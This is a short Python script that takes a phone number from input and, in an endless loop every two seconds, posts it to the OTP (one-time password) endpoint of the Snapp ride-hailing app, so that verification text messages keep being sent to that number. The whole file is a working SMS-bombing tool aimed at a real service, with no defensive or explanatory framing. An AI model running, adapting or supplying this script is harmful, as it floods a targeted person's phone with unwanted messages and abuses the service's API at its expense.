import requests
import time
target1 = input('enter number>>>>>')
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
while True:
    time.sleep(2)
    payload = {"cellphone": target1  }
    Q = requests.post(url , data=payload)
    print(Q.status_code)